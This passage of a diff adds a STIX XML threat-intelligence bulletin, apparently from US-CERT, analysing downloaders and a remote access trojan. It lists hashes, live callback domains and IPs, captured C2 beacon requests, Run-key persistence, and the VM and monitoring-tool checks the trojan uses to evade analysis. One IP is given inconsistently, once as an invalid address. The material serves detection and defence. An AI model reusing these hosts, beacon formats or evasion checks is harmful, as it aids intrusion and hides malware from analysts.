@@ -1,0 +1,693 @@
+<stix:STIX_Package xmlns:cyboxVocabs="http://cybox.mitre.org/default_vocabularies-2" xmlns:indicator="http://stix.mitre.org/Indicator-2" xmlns:cyboxCommon="http://cybox.mitre.org/common-2" xmlns:FileObj="http://cybox.mitre.org/objects#FileObject-2" xmlns:stixCommon="http://stix.mitre.org/common-1" xmlns:URIObj="http://cybox.mitre.org/objects#URIObject-2" xmlns:marking="http://data-marking.mitre.org/Marking-1" xmlns:tlpMarking="http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1" xmlns:stixVocabs="http://stix.mitre.org/default_vocabularies-1" xmlns:cybox="http://cybox.mitre.org/cybox-2" xmlns:stix="http://stix.mitre.org/stix-1" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:CISCP="http://www.us-cert.gov/ciscp" id="CISCP:IB-14-10105" version="1.1.1" xsi:schemaLocation="http://cybox.mitre.org/objects#DomainNameObject-1 http://cybox.mitre.org/XMLSchema/objects/Domain_Name/1.0/Domain_Name_Object.xsd http://cybox.mitre.org/objects#PortObject-2 http://cybox.mitre.org/XMLSchema/objects/Port/2.1/Port_Object.xsd http://cybox.mitre.org/common-2 http://cybox.mitre.org/XMLSchema/common/2.1/cybox_common.xsd http://cybox.mitre.org/objects#WinRegistryKeyObject-2 http://cybox.mitre.org/XMLSchema/objects/Win_Registry_Key/2.1/Win_Registry_Key_Object.xsd http://stix.mitre.org/default_vocabularies-1 http://stix.mitre.org/XMLSchema/default_vocabularies/1.1.1/stix_default_vocabularies.xsd http://cybox.mitre.org/objects#FileObject-2 http://cybox.mitre.org/XMLSchema/objects/File/2.1/File_Object.xsd http://data-marking.mitre.org/Marking-1 http://stix.mitre.org/XMLSchema/data_marking/1.1.1/data_marking.xsd http://cybox.mitre.org/objects#SocketAddressObject-1 http://cybox.mitre.org/XMLSchema/objects/Socket_Address/1.1/Socket_Address_Object.xsd http://stix.mitre.org/common-1 http://stix.mitre.org/XMLSchema/common/1.1.1/stix_common.xsd http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1 http://stix.mitre.org/XMLSchema/extensions/marking/tlp/1.1.1/tlp_marking.xsd http://stix.mitre.org/stix-1 http://stix.mitre.org/XMLSchema/core/1.1.1/stix_core.xsd http://cybox.mitre.org/objects#LinkObject-1 http://cybox.mitre.org/XMLSchema/objects/Link/1.1/Link_Object.xsd http://cybox.mitre.org/objects#AddressObject-2 http://cybox.mitre.org/XMLSchema/objects/Address/2.1/Address_Object.xsd http://cybox.mitre.org/default_vocabularies-2 http://cybox.mitre.org/XMLSchema/default_vocabularies/2.1/cybox_default_vocabularies.xsd http://cybox.mitre.org/objects#URIObject-2 http://cybox.mitre.org/XMLSchema/objects/URI/2.1/URI_Object.xsd http://stix.mitre.org/Indicator-2 http://stix.mitre.org/XMLSchema/indicator/2.1.1/indicator.xsd http://cybox.mitre.org/objects#EmailMessageObject-2 http://cybox.mitre.org/XMLSchema/objects/Email_Message/2.1/Email_Message_Object.xsd http://data-marking.mitre.org/extensions/MarkingStructure#Simple-1 http://stix.mitre.org/XMLSchema/extensions/marking/simple/1.1.1/simple_marking.xsd http://cybox.mitre.org/objects#MutexObject-2 http://cybox.mitre.org/XMLSchema/objects/Mutex/2.1/Mutex_Object.xsd http://cybox.mitre.org/objects#NetworkConnectionObject-2 http://cybox.mitre.org/XMLSchema/objects/Network_Connection/2.1/Network_Connection_Object.xsd http://us-cert.gov/ciscp http://www.us-cert.gov/sites/default/files/STIX_Namespace/ciscp_vocab_v1.1.1.xsd http://cybox.mitre.org/objects#HTTPSessionObject-2 http://cybox.mitre.org/XMLSchema/objects/HTTP_Session/2.1/HTTP_Session_Object.xsd http://cybox.mitre.org/cybox-2 http://cybox.mitre.org/XMLSchema/core/2.1/cybox_core.xsd">
+  <stix:STIX_Header>
+    <stix:Title>Malicious Downloaders, RAT, and Reverse Shell Utility Submitted for Analysis</stix:Title>
+    <stix:Package_Intent xsi:type="stixVocabs:PackageIntentVocab-1.0">Indicators - Malware Artifacts</stix:Package_Intent>
+    <stix:Description>On 31 January 2014, five malicious files were submitted for analysis.
+
+Downloaders:
+report.exe (MD5: ca115cc64402208f5e37f289cf1941b5)
+USPSSIBDSJDSS.exe (MD5: be074c3d9ea0838cd1cbdd957de2cabc)
+snkhymrh.exe (MD5: 067be741c9ce9bf8471f0af9fc9b5f1b)
+
+Remote Administrative Tool:
+Pretrial_Embedded.dll (MD5: a3e29e9e0adcc295a702350c4d5781ed)
+
+Reverse shell utility:
+Payment receipt 61665.exe (MD5: b149d2a2d6e065113915e2a13766c16a)
+
+The following call back sites were identified:
+allindiapackermover.com
+homevisitor.co.uk
+aarushenterprises.com
+4-access.com
+62.113.232.164
+176.9.245.16
+103.14.200.33
+188.227.165.115
+168.144.82.97
+
+This IB references US-CERT Malware Initial Findings Report MIFR-342934.</stix:Description>
+    <stix:Handling>
+      <marking:Marking>
+        <marking:Controlled_Structure>//node()</marking:Controlled_Structure>
+        <marking:Marking_Structure color="GREEN" xsi:type="tlpMarking:TLPMarkingStructureType"/>
+      </marking:Marking>
+    </stix:Handling>
+    <stix:Information_Source>
+      <stixCommon:Time>
+        <cyboxCommon:Produced_Time>2014-02-27T16:33:11Z</cyboxCommon:Produced_Time>
+      </stixCommon:Time>
+    </stix:Information_Source>
+  </stix:STIX_Header>
+  <stix:Indicators>
+    <stix:Indicator id="CISCP:indicator-a07aa695-8f4d-4711-a2de-50471bbc3712" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Composite_Indicator_Expression operator="OR">
+        <indicator:Indicator idref="CISCP:indicator-43250833-5a14-4e8f-bf82-3c98a70c5a16"/>
+        <indicator:Indicator idref="CISCP:indicator-8eb4dbe7-6e35-4a23-9ca4-49684e6db34a"/>
+        <indicator:Indicator idref="CISCP:indicator-c61602d2-ce81-4f5e-bb08-890b50261c83"/>
+        <indicator:Indicator idref="CISCP:indicator-f33d8879-7257-415a-868f-0fdb5a3ed71f"/>
+        <indicator:Indicator idref="CISCP:indicator-0d9811dc-f317-40e1-b18b-d2b5dc61ab75"/>
+        <indicator:Indicator idref="CISCP:indicator-019d99c9-9b5f-4a07-bd75-6cdca232d32e"/>
+        <indicator:Indicator idref="CISCP:indicator-341869ae-cbd5-4841-bf07-bd819d6b1183"/>
+        <indicator:Indicator idref="CISCP:indicator-505a34fc-1cf8-4dc4-9425-53aef19fd6d5"/>
+        <indicator:Indicator idref="CISCP:indicator-90f87606-461a-4683-b814-d897747c9e42"/>
+        <indicator:Indicator idref="CISCP:indicator-ca6832f5-58a6-4a12-bbc2-923c58fcb593"/>
+        <indicator:Indicator idref="CISCP:indicator-2950ed74-8dbf-43ac-94f4-d5f25eb52578"/>
+      </indicator:Composite_Indicator_Expression>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-43250833-5a14-4e8f-bf82-3c98a70c5a16" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>Compile Date 2009-12-05 22:50:52 UTC
+Analysis The submitted file is a dropper for an embedded PE file, "\%TEMP%\snkhymrh.exe". The
+file contains a large buffer of extraneous data beginning at offset 0x8400. The
+data begins with the string, "NullsoftInstx".
+The dropper also creates two additional files during execution:
+"\%TEMP%\setup.dat" --&gt; This file contains embedded binary data that begins at
+offset 0xC5BA.
+"\%TEMP%\rs.dat" --&gt; This file contains embedded binary data that begins at
+offset 0x13BB2.
+RELEVANT RESOURCE DATA -----&gt;
+Name: Icon Entry
+Label: 1
+Content:
+This resource object contains an icon of a desktop computer with a CD and a box.
+Name: Dialog
+Label: 105
+Content:
+105 DIALOGEX 0, 0, 280, 162, 0
+STYLE DS_SETFONT | DS_FIXEDSYS | DS_CENTER | WS_POPUPWINDOW | WS_DLGFRAME |
+WS_MINIMIZEBOX
+LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US
+FONT 8, "MS Shell Dlg"
+{
+PUSHBUTTON "", 3, 171, 142, 50, 14, NOT WS_VISIBLE | WS_GROUP
+PUSHBUTTON "", 1, 223, 142, 50, 14
+PUSHBUTTON "", 2, 7, 142, 50, 14
+LTEXT "", -1, 7, 138, 267, 1, SS_ETCHEDHORZ
+CONTROL "", 1018, "STATIC", NOT WS_VISIBLE | SS_BLACKRECT, 7, 6, 266, 130
+CTEXT "", 1028, 59, 145, 108, 8, WS_DISABLED
+}
+Name: Dialog
+Label: 106
+Content:
+106 DIALOGEX 0, 0, 266, 130, 0
+STYLE DS_SETFONT | DS_FIXEDSYS | DS_CONTROL | WS_CHILD
+LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US
+FONT 8, "MS Shell Dlg"
+{
+CONTROL "", 1004, "msctls_progress32", WS_BORDER, 24, 10, 241, 11
+CONTROL "", 1006, "STATIC", NOT WS_GROUP | SS_BLACKRECT | SS_GRAYFRAME |
+SS_NOPREFIX, 24, 0, 241, 8
+CONTROL "", 1016, "SysListView32", NOT WS_VISIBLE | WS_BORDER | WS_TABSTOP |
+0x00004005, 0, 25, 265, 104
+ICON 103, 1031, 0, 0, 22, 20
+PUSHBUTTON "", 1027, 0, 28, 60, 14, NOT WS_TABSTOP
+}
+Name: Dialog
+Label: 111
+Content:
+111 DIALOGEX 0, 0, 162, 22, 0
+STYLE DS_SETFONT | DS_MODALFRAME | DS_FIXEDSYS | DS_CENTER | WS_POPUP
+LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US
+FONT 8, "MS Shell Dlg"
+{
+CTEXT "", 1030, 7, 7, 148, 8
+}
+Name: Manifest
+Label: 1
+Content:
+&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;&lt;assembly
+xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"&gt;&lt;assemblyIdentity
+version="1.0.0.0" processorArchitecture="X86" name="Nullsoft.NSIS.exehead"
+type="win32"/&gt;&lt;description&gt;Nullsoft Install System v2.46&lt;/description&gt;&lt;trustInfo
+xmlns="urn:schemas-microsoft-com:asm.v3"&gt;&lt;security&gt;&lt;requestedPrivileges&gt;&lt;requestedEx
+ecutionLevel level="asInvoker"
+uiAccess="false"/&gt;&lt;/requestedPrivileges&gt;&lt;/security&gt;&lt;/trustInfo&gt;&lt;compatibility
+xmlns="urn:schemas-microsoft-com:compatibility.v1"&gt;&lt;application&gt;&lt;supportedOS
+Id="{35138b9a-5d96-4fbd-8e2d-a2440225f93a}"/&gt;&lt;supportedOS
+Id="{e2011457-1546-43c5-a5fe-008deee3d3f0}"/&gt;&lt;/application&gt;&lt;/compatibility&gt;&lt;/assembly&gt;</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-26cff8e7-5c7f-434f-ab31-425737e77984">
+        <cybox:Object id="CISCP:Object-98ac96a8-3c39-4a17-9752-f8dd9e8b9983">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">receipt_239742034729492349_234992384dj.pdf.exe</FileObj:File_Name>
+            <FileObj:Size_In_Bytes condition="Equals">105464</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">0b1798dca8808dd1e4b8b8d55bdcd51b</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">4cdb2ed758fb17f9dc9b041c8b8a728cd6164d62</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">3072:4gXdZt9P6D3XJcMMw70Z2rG/3gu1sDxKP13LvgnE3:4e34fMY0QrG/tCxI1rgnE3</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-01-31T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-8eb4dbe7-6e35-4a23-9ca4-49684e6db34a" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>Packer Microsoft Visual Basic v5.0
+Compile Date 2014-01-21 21:11:42 UTC
+Callbacks 62.113.232.164
+176.9.245.16
+Relationships file-2 callback-to host-5
+file-2 callback-to host-6
+Analysis The residual file is a downloader that calls back the following IP addresses via TCP
+port 80:
+62.113.232.164
+192.154.97.240 (only SYN packets are sent to this IP)
+GET REQUEST (62.113.232.164):
+GET
+/jUM1zPe9W2HGFLcIMP32b9EuQRsUcSoiOQPAIY0bKP9g1DI6kJssZ96Zv%2fEBt1PI3D2RWwL7BVHT2F23q
+1XIXy9O7J2nVMa60vxDZBQGBgATyRpg5RxYugpnp6Kw70IBDDO92LbNNWLoXpm75Ns%2bs19u4xmKbvFM5GW
+NZ9l7VL8LHZMKAgv6QTEU4DIP54X9BB7rd8hCtD6PGQBbq5%2bKSk6Ax%2bm84ta%2fQtQtoh9IhENd9aFrF
+XewCCixVneNe%2bmxn7Q12NLpsSC3uVzUhLsQYvFKuj1sAWyIYB41aGhTWFnCPJ2VvFh7B%2b3l4kfGLdwOm
+03rAO2bDPfUcqXb24MTleDvIYp8gZQzU16Lk7Q6F%2fUYcVne5cyo5PDI9y8OrlVEbbYY8EHMi%2f0g2zKRU
+46oGc00X4otgdGZQ1YYkAKq0HhVWe5e7CYdUG8u4LWm0U1FBlbtlSO7t5UC6psDaqwfglY HTTP/1.1
+Accept: */*
+Accept-Language: en-us
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+Host: 62.113.232.164
+Connection: Keep-Alive
+
+The file also injects code into the system process, "svchost.exe". The injected
+code spawns an instance of Internet Explorer ("iexplore.exe"). The child process,
+"iexplore.exe" calls back to the following IP address via TCP port 80:
+176.9.245.16
+GET REQUEST (176.9.245.16):
+GET
+/jUM1zPe9W2HGFLcIMP32b9EuQRsUcSoiOQPAIY0bKP9g1DI6kJssZ96Zv%2fEBt1PI3D2RWwL7BVHT2F23
+q1XIXy9O7J2nVMa60vxDZBQGBgATyRpg5RxYugpnp6Kw70IBDDO92LbNNWLoXpm75Ns%2bs19u4xmKbvFM5
+GWNZ9l7VL8LHZMKAgv6QTEU4DIP54X9BB7rd8hCtD6PGQBbq5%2bKSk6Ax%2bm84ta%2fQtQtoh9IhENd9a
+FrFXewCCixVneNe%2bmxn7Q12NLpsSC3uVzUhLsQYvFKuj1sAWyIYB41aGhTWFnCPJ2VvFh7B%2b3l4kfGL
+dwOm03rAO2bDPfUcqXb24MTleDvIYp8gZQzU16Lk7Q6F%2fUYcVne5cyo5PDI9y8OrlVEbbYY8EHMi%2f0g
+2zKRU46oGc00X4otgdGZQ1YYkAKq0HhVWe5e7CYdUG8u4LWm0U1FBlbtlSO7t5UC6psDaqwfglY HTTP/1.1
+Accept: */*
+Accept-Language: en-us
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+Host: 176.9.245.16
+Connection: Keep-Alive</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-7abc7b50-9f8d-4da8-ad8e-ab5477bbda21">
+        <cybox:Object id="CISCP:Object-48a71bac-8ccd-4b44-8dfe-fa17a07e2cd0">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">snkhymrh.exe</FileObj:File_Name>
+            <FileObj:Size_In_Bytes condition="Equals">61440</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">067be741c9ce9bf8471f0af9fc9b5f1b</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">e81d7a2de66831ea914ef99205043b46e8e2050f</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">768:LBAD62d904WDQR/UbwgY4M9U22+dY4S7dDjlU:L7eRWSQwgYqPq8DjO</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2014-01-31T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-c61602d2-ce81-4f5e-bb08-890b50261c83" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>Compile Date 2014-01-21 15:07:58 UTC
+Analysis The submitted file is a loader for an embedded DLL file. When executed, file drops a
+copy of itself into the file path: "\%USERPROFILE%\Local Settings\Application Data\ojvcacsa.exe". The file name used is not static. The file executes the Windows system application, "svchost.exe", decodes an embedded DLL file, writes the DLL file to the memory space of the "svchost.exe" process and executes the DLL file. The residual DLL file has not file name because it is not written to disk during execution. It will be referred to as, "Pretrial_Embedded.dll".</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-c49608d0-4512-4fe5-9414-03201b9e48bf">
+        <cybox:Object id="CISCP:Object-02d36800-e3b6-4188-a71c-900ecfbb0187">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">Pretrial_Notice_Washington_01_21_copy.exe</FileObj:File_Name>
+            <FileObj:Size_In_Bytes condition="Equals">99328</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">8e15fce84ec33502d6c528d440344881</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">4cf7ea5c18198122c8cf824fb19ca1554193a5f9</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">3072:OWxNZlVfBFOsnFaLCOKI6L7CPmISv+OR+JR:nxNx7OiOiiP/Sv</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2014-01-31T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-f33d8879-7257-415a-868f-0fdb5a3ed71f" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>Compile Date 2014-01-21 09:22:27 UTC
+Registry "Software\Microsoft\Windows\CurrentVersion\Run"
+Callbacks 103.14.200.33
+188.227.165.115
+168.144.82.97
+
+The residual file is injected into the process, "svchost.exe" by the loader file,
+"Pretrial_Notice_Washington_01_21_copy.exe". This file is a Remote Access Trojan
+that calls back to the following three IP addresses via TCP port 8080:
+103.14.200.33
+188.227.265.115
+168.144.82.97
+POST REQUEST -----&gt;
+00000000 50 4f 53 54 20 2f 41 37 35 41 46 46 46 36 42 45 POST /A7 5AFFF6BE
+00000010 42 44 43 36 38 39 30 46 46 33 41 42 31 41 32 43 BDC6890F F3AB1A2C
+00000020 46 34 32 42 33 37 32 41 35 34 43 31 43 31 36 42 F42B372A 54C1C16B
+00000030 20 48 54 54 50 2f 31 2e 31 0d 0a 41 63 63 65 70 HTTP/1. 1..Accep
+00000040 74 3a 20 2a 2f 2a 0d 0a 43 6f 6e 74 65 6e 74 2d t: */*.. Content-
+00000050 54 79 70 65 3a 20 61 70 70 6c 69 63 61 74 69 6f Type: ap plicatio
+00000060 6e 2f 78 2d 77 77 77 2d 66 6f 72 6d 2d 75 72 6c n/x-www- form-url
+00000070 65 6e 63 6f 64 65 64 0d 0a 55 73 65 72 2d 41 67 encoded. .User-Ag
+00000080 65 6e 74 3a 20 4d 6f 7a 69 6c 6c 61 2f 35 2e 30 ent: Moz illa/5.0
+00000090 20 28 57 69 6e 64 6f 77 73 20 4e 54 20 36 2e 31 (Window s NT 6.1
+000000A0 3b 20 57 4f 57 36 34 3b 20 72 76 3a 32 35 2e 30 ; WOW64; rv:25.0
+000000B0 29 20 47 65 63 6b 6f 2f 32 30 31 30 30 31 30 31 ) Gecko/ 20100101
+000000C0 20 46 69 72 65 66 6f 78 2f 32 35 2e 30 0d 0a 48 Firefox /25.0..H
+000000D0 6f 73 74 3a 20 31 30 33 2e 31 34 2e 32 30 30 2e ost: 103 .14.200.
+000000E0 33 33 3a 38 30 38 30 0d 0a 43 6f 6e 74 65 6e 74 33:8080. .Content
+000000F0 2d 4c 65 6e 67 74 68 3a 20 33 30 39 0d 0a 43 61 -Length: 309..Ca
+00000100 63 68 65 2d 43 6f 6e 74 72 6f 6c 3a 20 6e 6f 2d che-Cont rol: no-
+00000110 63 61 63 68 65 0d 0a 0d 0a 80 00 00 00 39 88 15 cache... .....9..
+00000120 92 ff ec f2 9b 84 a7 0e cf 2a 2b d8 98 81 61 c4 ........ .*+...a.
+00000130 8a ca 6b f2 08 bd 05 39 cf 1c c9 f7 12 18 3a 30 ..k....9 ......:0
+00000140 69 80 be 15 81 b5 28 0a a9 0d f6 e4 78 34 18 d1 i.....(. ....x4..
+00000150 30 1a 0e 87 6a 2e 38 01 78 1a 89 3c d9 19 75 c5 0...j.8. x..&lt;..u.
+00000160 c7 bd bb 2e c7 66 cf aa ea 7e 21 ef fe 51 db f4 .....f.. .~!..Q..
+00000170 79 e0 0e 69 7f 5f 09 cf 68 da d9 56 ac 7a 55 38 y..i._.. h..V.zU8
+00000180 34 bf 0f f7 cb e2 ee 7b 8a 7f 78 89 4a ce d4 28 4......{ ..x.J..(
+00000190 ad 53 0d 30 04 1b 91 8d 74 33 9c 5c 39 ad 00 00 .S.0.... t3.\9...
+000001A0 00 95 bc 77 a1 40 7f 67 95 7a 61 46 8d 8c a3 8c ...w.@.g .zaF....
+000001B0 c4 a3 96 60 6d 06 fb bc c6 0d be 7b a3 8f 79 6d ...`m... ...{..ym
+000001C0 d9 11 e5 49 94 bf ec 00 05 99 f3 42 73 b9 96 02 ...I.... ...Bs...
+000001D0 5a 1f d7 f1 48 ac 22 64 fc 78 61 2e f8 5b bb d2 Z...H."d .xa..[..
+000001E0 0e ed 51 e4 fd ee b6 b1 b4 b5 22 3e 47 f3 df d4 ..Q..... .."&gt;G...
+000001F0 90 c4 03 ba 2e 19 88 4b 34 f5 f3 2f 98 95 17 c2 .......K 4../....
+00000200 3b 49 66 26 b0 1d c6 44 28 6a 25 dd b0 94 a7 02 ;If&amp;...D (j%.....
+00000210 f4 56 6c e3 07 ad e7 92 53 e0 b6 3c 3b e8 37 06 .Vl..... S..&lt;;.7.
+00000220 be 9d 96 df 2b 18 c7 47 56 59 a3 77 61 58 6d 61 ....+..G VY.waXma
+00000230 57 8e 87 55 35 3a 58 1f 43 e2 44 4b 5e 3f 60 24 W..U5:X. C.DK^?`$
+00000240 e6 85 76 e2 b2 73 a2 78 b7 ab bb a3 27 3a ..v..s.x ....':
+
+Entrenchment ----&gt;
+The file is capable of setting the following registry key for persistence purposes:
+"Software\Microsoft\Windows\CurrentVersion\Run"
+
+VM AND SYSTEM UTILITY AWARENESS -----&gt;
+The file is capable of enumerating running processes and parsing for VMWare/VirtualBox /Parallels/ related processes as well as some system monitoring tools (See below):
+
+VMWare/VirtualBox/Parallels:
+VBoxTray.exe
+VBoxService.exe
+vmusrvc.exe
+vmsrvc.exe
+prl_cc.exe
+prl_tools.exe
+
+System Monitoring Tools:
+wireshark.exe
+Tfrmrpcap
+iptools.exe
+ProcessHacker
+
+The file is also capable of detecting virtual environments by parsing specific values in the local registry:
+SYSTEM\CurrentControlSet\services\Disk\Enum
+SYSTEM\CurrentControlSet\Enum\PCI\VEN_15AD&amp;DEV_0774&amp;SUBSYS_040515AD&amp;REV_00
+SYSTEM\CurrentControlSet\Enum\PCI\VEN_80EE&amp;DEV_CAFE&amp;SUBSYS_00000000&amp;REV_00
+SYSTEM\CurrentControlSet\Enum\PCI\VEN_5333&amp;DEV_8811&amp;SUBSYS_00000000&amp;REV_00
+SYSTEM\CurrentControlSet\Enum\PCI\VEN_80EE&amp;DEV_BEEF&amp;SUBSYS_00000000&amp;REV_00
+SYSTEM\CurrentControlSet\Enum\PCI\VEN_80EE&amp;DEV_CAFE&amp;SUBSYS_00000000&amp;REV_00
+HARDWARE\ACPI\DSDT\AMIBI
+HARDWARE\DESCRIPTION\System\BIOS
+
+PDB String: C:\Users\DmitryHELL\Documents\SysIQUA\loader_1.4
+s2\loader_v4\loader_v3\Release\dll.pdb
+Export Functions -----&gt;
+Name: Work
+Ordinal: 1
+Entry Point: 0x10004DC0</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-fa7441df-3f0c-4c09-a42b-9274468908f0">
+        <cybox:Object id="CISCP:Object-1392222f-d7f8-4dfe-ba38-97c14787841a">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">Pretrial_Embedded.dll</FileObj:File_Name>
+            <FileObj:Size_In_Bytes condition="Equals">65536</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">a3e29e9e0adcc295a702350c4d5781ed</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">92eb6262062d65b859323b27501c9c36e74014ef</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">1536:N1Gyzc5CAdFrfkFGcuhaQgl6v/0DNHUYbLOyZeZjOLfJxFwKW01OGR/xOi7OCyKO:N1GyAdFrMFGcuhaZb+C+</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
